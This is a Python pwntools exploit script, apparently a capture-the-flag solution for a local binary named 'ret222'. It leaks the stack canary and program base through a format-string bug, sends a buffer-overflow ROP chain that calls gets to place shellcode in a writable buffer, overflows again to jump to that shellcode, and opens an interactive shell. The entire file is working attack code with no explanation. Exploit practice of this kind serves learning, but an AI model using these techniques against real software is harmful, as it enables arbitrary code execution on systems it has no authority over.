#!/usr/bin/env python

from pwn import *

r = process('./ret222')

context.arch = 'amd64'

def setname(data):
    r.sendlineafter('>', '1')
    r.sendafter(':', data)

def showinfo():
    r.sendlineafter('>', '2')
    r.recvuntil(':')

def savedata(data):
    r.sendlineafter('>', '3')
    r.sendlineafter(':', data)

def ex():
    r.sendlineafter('>', '4')

setname("%23$p")
showinfo()
canary = int(r.recvuntil('*')[2:-1], 16)
log.info(hex(canary))

setname("%24$p")
showinfo()
base = int(r.recvuntil('*')[2:-1], 16) - 0xd40
log.info(hex(base))

name = base + 0x202020
main = base + 0xc00
gets = base + 0x908
pop_rdi = base + 0xda3

payload = 'a' * 136 + flat(canary, 'deadbeef', pop_rdi, name, gets, main)
savedata(payload)
ex()

r.sendline(asm(shellcraft.sh()))

payload = 'a' * 136 + flat(canary, 'deadbeef', name)
savedata(payload)
ex()

r.interactive()
